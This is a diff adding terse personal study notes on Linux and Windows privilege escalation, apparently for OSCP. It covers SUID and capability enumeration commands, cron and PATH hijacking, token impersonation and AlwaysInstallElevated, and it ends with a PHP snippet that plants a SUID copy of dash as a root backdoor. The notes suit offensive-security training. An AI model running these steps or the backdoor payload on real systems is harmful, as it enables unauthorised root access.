@@ -1,0 +1,77 @@
+Priv Escalation Linux
+======================
+1.Linux Kernal ---> Version <=4.5 ---> exploit
+2.SUDO -l --------> list all the possible file/command/tool, we run somethings as root privilages
+
+		  /usr/bin/find 
+		 gtobins --> find
+3.SUID/stricky bit permission: 
+		---> 1.linpeas.sh
+ 		---> 2.find / -u=s -type f 2>/dev/null, find / -perm -u=s 2>/dev/null
+find / -perm -4000 2>/dev/null
+find / -user root -perm -4000 -exec ls -ldb {} \; 2> /dev/null
+
+4.Cronjob --------->schedule a task for a partical time stamp
+		--->data.sh/data.py [2/3 minitues]
+		---> /etc/passwd ---> reverse shell
+
+5.path manipulation:
+		--->data --> executable permission
+		--->strings data
+		--->curl
+		--->goto /tmp --->curl -->file --->#!/bin/bash --->chmod 777 curl ---> echo $PATH ---> export path=/tmp:$PATH
+
+6.Automated way for the above ---> linpeas.sh
+
+	-->sudo -l
+	-->SUID 
+	-->cronjob
+	-->stored credentials
+
+
+Priv Escalation Windows
+======================
+
+1.kernel exploitations:
+		-->systeminfo ---> hotsfix ---> zero --> rotenpatato.exe
+
+2.Stored credentails:
+		-->admin:admin--> runs -->
+
+3.Impersanation of the token/User privilage Impersanation
+		-->rotenpatato.exe
+
+4.Always Elelvated installed:
+		-->Generate the EXE file using msf
+
+5.Printer Exploit:
+		-->printspooler.exe
+
+
+Tools:
+
+1.winpeas.exe/winpeas.bat
+
+2.Powerup.ps1 -->banned in OSCP
+		--> Invoke-AllChecks -verbose
+
+File transfer process:
+
+	1.certutil
+	2.Powershell file transfer from linux to windows
+
+Offsec
+
+PrivEsc
+netstat -tunlp
+ps aux |grep -i 'root' --color=auto --> check with squar bracket []
+
+mount
+getcap -r / 2>/dev/null
+getcap -R / 2>/dev/null
+
+
+<?php
+echo "Offsec Says Hellow.";
+system("cp /bin/dash /var/tmp/dash ; chmod u+s /var/tmp/dash");
+?>
